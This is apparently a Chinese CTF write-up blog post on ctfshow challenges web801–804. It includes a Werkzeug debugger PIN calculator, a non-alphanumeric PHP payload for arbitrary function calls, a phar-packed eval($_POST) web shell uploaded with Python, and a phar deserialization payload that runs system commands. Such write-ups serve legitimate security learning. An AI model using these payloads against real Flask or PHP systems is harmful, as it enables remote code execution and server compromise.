---
title: ctfshow 常见姿势
date: 2024-10-21 21:52:39
permalink: /pages/a43171/
author: 
  name: Cola
  link: https://the0n3.top
---
# ctfshow 常见姿势

## web801

flask pin值计算，读取文件，脚本计算pin码。梭哈

非预期：`url/file?filename=/flag`

预期：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # username，通过/etc/passwd
    'flask.app',  # modname，默认值
    'Flask',  # 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # moddir，通过报错获得
]
# 填入获取的16进制即可，后面添加了转换功能
address = '02:42:ac:0c:e8:a0'
address = int(address.replace(':', ''),16)
private_bits = [
    f'{address}',  # mac十进制值 /sys/class/net/eth0/address
    '225374fa-04bc-4346-9f39-48fa82829ca934b345d280f694439fa54c01aa968eef81f55a7e5baa3e39db57884e39217606'  # 看上面machine-id部分
]

# 下面为源码里面抄的，不需要修改
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

# 下面为源码里面抄的，不需要修改
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![1](https://the0n3.top/medias/show800/1.png)


## web802

限制非字母数字，可以用字符，自增构造字符

构造`$_GET[_]($_GET[__])`

```php
<?php
$___=((''/'').'')[''==_];# $___ = N
$____=((''/'').'')[''==''];# $____ = A
++$____;
++$____;
++$____;
$_____=++$____; # $_____ = E

++$____;
++$____;
$______ = $____; # $______ = G

++$___;++$___;++$___;++$___;++$___;
$_______=++$___; # $______ = T# 

$________='_'.$______.$_____.$_______;
$$________[_]($$________[__]); # $_GET[_]($_GET[__])
```

简化

```php
$___=((''/'').'')[''==_];$____=((''/'').'')[''==''];++$____;++$____;++$____;$_____=++$____;++$____;++$____;$______ = $____;++$___;++$___;++$___;++$___;++$___;$_______=++$___;$________='_'.$______.$_____.$_______;$$________[_]($$________[__]);
```

整个payload使用post发包，url编码一下，避免`$`,`=`具有特殊语意

![2](https://the0n3.top/medias/show800/2.png)

## web803

phar文件包含，第一次接触，后续详细学习一下

这里审计起来有点奇怪，不存在`$file.txt`就写一个`$file`，写了`$file`那`$file.txt`不还是不存在？通过`file_put_contents`函数直接写🐎不现实了，可以了解到这里可以通过phar打包一个`$file.txt`到服务器，使文件包含成为了可能

```php
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

生成phar文件，里面打包一个`a.txt`，内容为`<?php highlight_file(__FILE__);eval($_POST[1]);?>`

```php
<?php
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

使用python发包

```python
import requests

url="http://7fce7e3d-4206-4f91-b196-7536bde12046.challenge.ctf.show/"

data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

通过phar协议包含文件

![3](https://the0n3.top/medias/show800/3.png)

## web804

unlink会触发反序列化

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

重点在`hacker`类析构函数存在命令执行

```php
<?php 
class hacker{
    public $code = 'system("tac /f*;tac f*");';
}
$a=new hacker();
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "111");
$phar->stopBuffering();
?>
```

python发包

```python
import requests

url="http://4d03da6f-da2a-4b1e-beb3-b1ad422e3af6.challenge.ctf.show/"

data1={'file':'/tmp/aa.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

![4](https://the0n3.top/medias/show800/4.png)


## 待更新